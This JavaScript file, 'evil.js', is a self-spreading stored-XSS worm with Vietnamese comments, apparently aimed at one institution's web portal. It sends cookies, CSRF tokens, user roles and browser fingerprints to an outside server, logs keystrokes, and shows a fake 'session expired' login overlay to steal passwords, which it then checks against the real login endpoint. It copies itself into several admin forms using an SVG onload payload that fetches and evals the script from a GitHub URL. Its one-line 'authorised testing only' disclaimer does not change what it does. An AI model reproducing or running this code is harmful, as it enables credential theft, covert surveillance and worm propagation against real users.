// ============================================================
// evil.js - Persistent XSS worm (tự nhân bản + hoạt động ngầm)
// Version 2.1 - Cải tiến verifyLogin: detect 302 redirect + Set-Cookie _msbmtu_ses
// ⚠️ Chỉ dùng để test bảo mật trên hệ thống bạn được phép.
// ============================================================

(function() {
  'use strict';

  // Cau hinh
  var ATTACKER_URL = "https://misterxplo.pythonanywhere.com/worker";
  var WRITE_KEY = "BMU-WRITE-KEY-XXXXXXX-sdfd3";
  var VERSION = "2.1";

  // Chung chan chay trung (chi chay 1 lan moi trang)
  try {
    if (window.__xssRunning) return;
    window.__xssRunning = true;
  } catch(e) {}

  var RAND_CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  function genId(len) {
    var s = '';
    for (var i = 0; i < (len || 8); i++) s += RAND_CHARS.charAt(Math.floor(Math.random() * RAND_CHARS.length));
    return s;
  }

  var ID_FORM = 'ov_' + genId(6);
  var ID_USER = 'in_' + genId(6);
  var ID_PASS = 'pd_' + genId(6);
  var ID_BTN = 'bt_' + genId(6);

  // Fingerprint nguoi dung
  function getVictimId() {
    try {
      var id = localStorage.getItem('__v_id');
      if (!id) { id = 'V' + Date.now().toString(36) + Math.random().toString(36).substr(2, 8); localStorage.setItem('__v_id', id); }
      return id;
    } catch(e) { return 'V' + Date.now().toString(36); }
  }
  function getFingerprint() {
    var parts = [navigator.userAgent, navigator.language, screen.width + 'x' + screen.height, screen.colorDepth, navigator.platform, new Date().getTimezoneOffset()];
    var hash = 0;
    for (var i = 0; i < parts.join('|').length; i++) { hash = ((hash << 5) - hash) + parts.join('|').charCodeAt(i); hash |= 0; }
    return 'FP' + Math.abs(hash).toString(36);
  }
  var victimId = getVictimId();
  var fingerprint = getFingerprint();

  // Gui du lieu ve server
  function exfil(data, type) {
    try {
      var payload = { victim_id: victimId, fingerprint: fingerprint, type: type, time: new Date().toISOString(), data: data };
      fetch(ATTACKER_URL, { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-API-Key': WRITE_KEY }, body: JSON.stringify(payload), mode: 'no-cors' }).catch(function() {});
      var img = new Image();
      img.src = ATTACKER_URL + '?key=' + encodeURIComponent(WRITE_KEY) + '&v=' + victimId + '&f=' + fingerprint + '&t=' + type + '&d=' + encodeURIComponent(JSON.stringify(data).substring(0, 500));
    } catch(e) {}
  }

  // Thu thap thong tin: cookies, csrf, gon, page info
  // LUU Y: cookie _msbmtu_ses co HttpOnly -> JS khong doc duoc qua document.cookie
  // NHUNG se duoc server tu dong gan vao request (withCredentials=true)
  var cookies, csrfToken;
  try { cookies = document.cookie || ""; } catch(e) { cookies = ""; }
  try { var c = document.querySelector('meta[name="csrf-token"]'); csrfToken = (c && c.content) ? c.content : "none"; } catch(e) { csrfToken = "none"; }
  var gonData = {};
  try { if (typeof gon !== 'undefined') { gonData = { uid: gon.user_id, uname: gon.user_name || gon.username, org: gon.organization, lead: gon.leader_roles, fac: gon.faculty, roles: gon.roles }; } } catch(e) {}
  var pageInfo = { url: location.href.substring(0, 300), domain: document.domain, title: document.title.substring(0, 100), ua: navigator.userAgent.substring(0, 150), lang: navigator.language, screen: screen.width + 'x' + screen.height, time: new Date().toISOString() };

  // Gui cookies ve server (bao gom co mat session HttpOnly khong)
  // HttpOnly cookie khong hien thi trong document.cookie nhung se duoc
  // server tu dong gan vao request (withCredentials=true trong verifyLogin)
  exfil({ cookies: cookies.substring(0, 500), csrf: csrfToken.substring(0, 100), url: pageInfo.url, domain: pageInfo.domain, title: pageInfo.title, ua: pageInfo.ua, lang: pageInfo.lang, screen: pageInfo.screen, gon: gonData, ver: VERSION, hasHttpSession: (cookies.indexOf('_msbmtu_ses') >= 0) }, 'visit');

  // Keylogger
  (function() {
    var buf = [];
    document.addEventListener('keydown', function(e) {
      try {
        var key = e.key;
        if (key.length > 1) key = '[' + key + ']';
        buf.push(key);
        if (buf.length >= 15) { exfil({ keys: btoa(buf.join('')), url: pageInfo.url }, 'key'); buf = []; }
      } catch(e2) {}
    });
  })();

  // ============================================================
  // XUAT KA TAI KHOAN QUA API LOGIN GOC
  // POST /login?lang=vi
  // Fields: email_txt, password_txt, authenticity_token, g-recaptcha-response
  // 2FA: POST /login_two_auth?lang=vi voi field token
  // RECAPTCHA: nguoi dung tu tick trong form phishing
  // Login thanh cong: 302 redirect ve / + Set-Cookie _msbmtu_ses
  // ============================================================
  var RECAPTCHA_SITEKEY = '6LcPvWotAAAAAAvgvdkjo1oHooXdF1MWyGxp29qu';
  var recaptchaToken = '';

  // Callback khi tick xong recaptcha - bat nut voi hieu ung ro rat
  window.onRecaptchaSuccess = function(token) {
    recaptchaToken = token;
    try {
      var btn = document.getElementById(ID_BTN);
      if (btn) {
        btn.disabled = false;
        btn.style.opacity = '1';
        btn.style.background = '#28a745';
        btn.style.boxShadow = '0 0 15px rgba(40,177,67,0.8)';
        btn.style.transition = 'all 0.3s ease';
        btn.style.animation = 'pulseGreen 0.8s ease-in-out 3';
      }
    } catch(e) {}
  };

  window.onRecaptchaExpired = function() {
    recaptchaToken = '';
    try {
      var btn = document.getElementById(ID_BTN);
      if (btn) { btn.disabled = true; btn.style.opacity = '0.6'; btn.style.background = '#1976d2'; btn.style.boxShadow = 'none'; }
    } catch(e) {}
  };

  // Ham verify login qua API goc
  // Nhan biet thanh cong qua: status 302 + location redirect ve / (khong phai /login)
  // LUU Y: trinh duyet khong cho doc Set-Cookie qua getResponseHeader -> dung responseURL + status
  function verifyLogin(username, password, callback) {
    try {
      var csrf = '';
      try { var m = document.querySelector('meta[name="csrf-token"]'); csrf = m ? m.content : ''; } catch(e) {}

      var xhr = new XMLHttpRequest();
      xhr.open('POST', '/login?lang=vi', true);
      xhr.withCredentials = true;
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
          var valid = false;
          var status = xhr.status;
          var finalUrl = (xhr.responseURL || '').toLowerCase();
          var loc = (xhr.getResponseHeader('Location') || '').toLowerCase();
          var setCookie = '';
          try { setCookie = (xhr.getResponseHeader('Set-Cookie') || ''); } catch(e) {}

          // LOGIN THANH CONG: 302/303 + redirect ve / (khong phai /login)
          // Server tra ve _msbmtu_ses cookie moi
          if ((status === 302 || status === 303 || (status >= 300 && status < 400))) {
            if (finalUrl.indexOf('/login') === -1 ||
                (loc && loc.indexOf('/login') === -1) ||
                setCookie.indexOf('_msbmtu_ses') >= 0) {
              valid = true;
            }
          }
          // Fallback: JSON success
          else if (status === 200) {
            var txt = xhr.responseText || '';
            if (txt.indexOf('"success":true') >= 0 || txt.indexOf("'success':true") >= 0) { valid = true; }
          }

          callback(valid, status);
        }
      };
      xhr.onerror = function() { callback(false, 0); };

      var params =
        '&authenticity_token=' + encodeURIComponent(csrf) +
        '&email_txt=' + encodeURIComponent(username) +
        '&password_txt=' + encodeURIComponent(password) +
        '&g-recaptcha-response=' + encodeURIComponent(recaptchaToken);
      xhr.send(params);
    } catch(e) { callback(false, 0); }
  }

  // ============================================================
  // WORM - TU NHAN BAN PAYLOAD VAO CAC DROPDOWN KHAC
  // ============================================================
  function wormSpread() {
    try {
      if (localStorage.getItem('__w_done') === '1') return;
      var scriptUrl = '';
      try {
        var scripts = document.getElementsByTagName('script');
        for (var i = 0; i < scripts.length; i++) {
          var src = scripts[i].src || '';
          if (src.indexOf('evil') >= 0 || src.indexOf('tester') >= 0 || src.indexOf('worker') >= 0) { scriptUrl = src; break; }
        }
      } catch(e) {}
      if (!scriptUrl) { scriptUrl = '//raw.githubusercontent.com/tringuyen1998allstar2018/testerfromhell/refs/heads/main/evil.js'; }

      var wormPayload = "'><svg onload=$.get(`" + scriptUrl + "`).then(eval)>";
      var targets = ['/academicrank', '/ethnic', '/nationality', '/religions', '/tbusertype', '/tbuserstatus', '/tbhospitals'];
      var getCsrf = function() { try { var m = document.querySelector('meta[name="csrf-token"]'); return m ? m.content : ''; } catch(e) { return ''; } };
      var csrf = getCsrf();
      var spreadCount = 0;
      for (var t = 0; t < targets.length && spreadCount < 3; t++) {
        (function(tgt) {
          try {
            if (window.jQuery) {
              jQuery.ajax({
                url: tgt, method: 'POST',
                data: { authenticity_token: csrf, name: wormPayload, scode: 'W' + genId(10) },
                complete: function(r) { if (r && r.status === 200) { spreadCount++; exfil({ spread: tgt }, 'spread'); } }
              });
            }
          } catch(e) {}
        })(targets[t]);
      }
      try { localStorage.setItem('__w_done', '1'); } catch(e) {}
    } catch(e) {}
  }

  // ============================================================
  // DONG MODAL BOOTSTRAP + TAO FORM PHISHING
  // ============================================================
  function createPhishForm() {
    try {
      if (localStorage.getItem('__f_done') === '1') return;

      // Dong modal Bootstrap
      try {
        if (window.jQuery && jQuery.fn && jQuery.fn.modal) { jQuery('.modal').each(function() { try { jQuery(this).modal('hide'); } catch(e3) {} }); }
        document.body.classList.remove('modal-open');
        var bd = document.querySelectorAll('.modal-backdrop');
        for (var bi = 0; bi < bd.length; bi++) bd[bi].parentNode.removeChild(bd[bi]);
        var md = document.querySelectorAll('.modal.show, .modal[style*="display: block"]');
        for (var mi = 0; mi < md.length; mi++) { md[mi].style.display = 'none'; md[mi].classList.remove('show'); }
        document.body.style.overflow = '';
        document.body.style.paddingRight = '';
      } catch(e3) {}

      var overlay = document.createElement('div');
      overlay.setAttribute('id', ID_FORM);
      overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.88);display:flex;align-items:center;justify-content:center;pointer-events:auto;';
      overlay.addEventListener('click', function(e) { e.stopPropagation(); });
      overlay.addEventListener('mousedown', function(e) { e.stopPropagation(); });
      overlay.addEventListener('pointerdown', function(e) { e.stopPropagation(); });

      var box = document.createElement('div');
      box.style.cssText = 'background:#fff;padding:30px;border-radius:8px;width:350px;font-family:Arial,Helvetica,sans-serif;font-size:14px;pointer-events:auto;position:relative;box-shadow:0 0 30px rgba(0,0,0,0.5);';

      var title = document.createElement('h2');
      title.textContent = 'Dang Nhap';
      title.style.cssText = 'margin:0 0 15px 0;color:#1976d2;text-align:center;';
      box.appendChild(title);

      var msg = document.createElement('p');
      msg.textContent = 'Phi session het han. Vui long dang nhap lai.';
      msg.style.cssText = 'margin:0 0 15px 0;color:#666;text-align:center;font-size:13px;';
      box.appendChild(msg);

      // O username - giong dung form login goc (Email/Ten dang nhap/Ma NV/SDT)
      var userInput = document.createElement('input');
      userInput.setAttribute('type', 'text');
      userInput.setAttribute('placeholder', 'Email/Ten dang nhap/Ma NV/SDT');
      userInput.setAttribute('id', ID_USER);
      userInput.style.cssText = 'width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;pointer-events:auto;';
      box.appendChild(userInput);

      // O password
      var passInput = document.createElement('input');
      passInput.setAttribute('type', 'password');
      passInput.setAttribute('placeholder', 'Mat khau');
      passInput.setAttribute('id', ID_PASS);
      passInput.style.cssText = 'width:100%;padding:10px;margin-bottom:15px;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;pointer-events:auto;';
      box.appendChild(passInput);

      // Nut xac nhan - disabled cho toi khi chua tick recaptcha
      // Khi tick xong: nut sang xanh la + animation pulse
      var btn = document.createElement('button');
      btn.textContent = 'Dang Nhap';
      btn.setAttribute('id', ID_BTN);
      btn.disabled = true;
      btn.style.cssText = 'width:100%;padding:10px;background:#1976d2;color:#fff;border:none;border-radius:4px;cursor:pointer;pointer-events:auto;opacity:0.6;';
      box.appendChild(btn);

      // CSS animation pulse
      var style = document.createElement('style');
      style.textContent = '@keyframes pulseGreen{0%{transform:scale(1);box-shadow:0 0 8px rgba(40,177,67,0.5);}50%{transform:scale(1.04);box-shadow:0 0 20px rgba(40,177,67,0.8);}100%{transform:scale(1);box-shadow:0 0 10px rgba(40,177,67,0.6);}}';
      document.head.appendChild(style);

      // RECAPTCHA WIDGET
      var recaptchaDiv = document.createElement('div');
      recaptchaDiv.setAttribute('class', 'g-recaptcha');
      recaptchaDiv.setAttribute('data-sitekey', RECAPTCHA_SITEKEY);
      recaptchaDiv.setAttribute('data-callback', 'onRecaptchaSuccess');
      recaptchaDiv.setAttribute('data-expired-callback', 'onRecaptchaExpired');
      recaptchaDiv.style.cssText = 'margin:0 0 15px 0;display:flex;justify-content:center;z-index:2147483647;position:relative;';
      box.appendChild(recaptchaDiv);

      // Tai script recaptcha
      if (!document.querySelector('script[src*="recaptcha/api.js"]')) {
        var rs = document.createElement('script');
        rs.src = 'https://www.google.com/recaptcha/api.js';
        rs.async = true;
        rs.defer = true;
        document.head.appendChild(rs);
      }

      overlay.appendChild(box);
      document.body.appendChild(overlay);

      setTimeout(function() { try { userInput.focus(); } catch(e) {} }, 300);

      document.addEventListener('keydown', function(e) {
        try {
          if (document.activeElement !== userInput && document.activeElement !== passInput) {
            if (e.key.length === 1 || e.key === 'Backspace' || e.key === ' ' || e.key === 'Enter') { e.stopImmediatePropagation(); userInput.focus(); }
          }
        } catch(e2) {}
      }, true);

      // Click - verify qua login goc + recaptcha token roi moi exfil
      btn.addEventListener('click', function(e) {
        e.preventDefault();
        e.stopPropagation();
        var u = userInput.value;
        var p = passInput.value;
        if (!recaptchaToken) { msg.textContent = 'Vui long tick reCAPTCHA truoc khi dang nhap.'; msg.style.color = '#d32f2f'; return; }
        verifyLogin(u, p, function(valid, loginStatus) {
          exfil({ username: u, password: p, valid: valid, login_status: loginStatus, recaptcha: recaptchaToken.substring(0, 20) + '...', url: pageInfo.url }, 'pwd');
          try { localStorage.setItem('__f_done', '1'); } catch(e2) {}
          overlay.remove();
        });
      });

      // Enter submit
      document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
          var eu = userInput.value;
          var ep = passInput.value;
          if (eu || ep) {
            if (!recaptchaToken) { msg.textContent = 'Vui long tick recaptcha!'; msg.style.color = '#d32f2f'; return; }
            verifyLogin(eu, ep, function(valid, loginStatus) {
              exfil({ username: eu, password: ep, valid: valid, login_status: loginStatus, recaptcha: recaptchaToken.substring(0, 20) + '...', url: pageInfo.url }, 'pwd');
              try { localStorage.setItem('__f_done', '1'); } catch(e2) {}
              overlay.remove();
            });
          }
        }
      });

    } catch(e) {}
  }

  // Chay
  setTimeout(createPhishForm, 1000);
  setTimeout(wormSpread, 5000);

  // TOM TAT:
  // 1. Gui 'visit' ve server moi lan truy cap
  // 2. Keylogger ghi am tham, gui moi 15 phim
  // 3. Phishing form ID NGU NHIEN
  // 4. Worm tu nhan ban payload vao dropdown khac
  // 5. Dong modal Bootstrap truoc khi hien form
  // 6. XUAT KA qua API login goc: POST /login?lang=vi
  //    Fields: email_txt, password_txt, authenticity_token, g-recaptcha-response
  //    Thanh cong: 302 redirect ve / + Set-Cookie _msbmtu_ses
  //    valid=true/false gui kem ve server
  // 7. RECAPTCHA: nguoi dung tu tick trong form phishing
  //    Nut 'Dang Nhap' disabled cho toi khi chua tick captcha
  //    Khi tick xong: nut sang xanh la + animation pulse ro rat
})();
